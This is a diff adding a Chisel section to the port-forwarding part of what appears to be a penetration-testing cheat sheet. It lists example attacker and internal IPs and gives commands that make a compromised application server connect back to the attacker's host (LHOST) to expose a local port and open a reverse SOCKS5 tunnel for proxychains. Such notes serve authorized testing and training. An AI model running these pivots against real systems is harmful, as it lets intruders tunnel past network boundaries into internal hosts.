@@ -4124,6 +4124,47 @@ RETR <NUMBER>
 
 ## Port Forwarding
 
+### Chisel
+
+| System             | IP address     |
+| ------------------ | -------------- |
+| LHOST              | 192.168.50.10  |
+| APPLICATION SERVER | 192.168.100.10 |
+| DATABASE SERVER    | 10.10.100.20   |
+| WINDOWS HOST       | 172.16.50.10   |
+
+#### Reverse Pivot
+
+- LHOST < APPLICATION SERVER
+
+##### LHOST
+
+```c
+$ ./chisel server -p 9002 -reverse -v
+```
+
+##### APPLICATION SERVER
+
+```c
+$ ./chisel client 192.168.50.10:9002 R:3000:127.0.0.1:3000
+```
+
+#### SOCKS5 / Proxychains Configuration
+
+- LHOST > APPLICATION SERVER > NETWORK
+
+##### LHOST
+
+```c
+$ ./chisel server -p 9002 -reverse -v
+```
+
+##### APPLICATION SERVER
+
+```c
+$ ./chisel client 192.168.50.10:9002 R:socks
+```
+
 ### Ligolo-ng
 
 > https://github.com/nicocha30/ligolo-ng
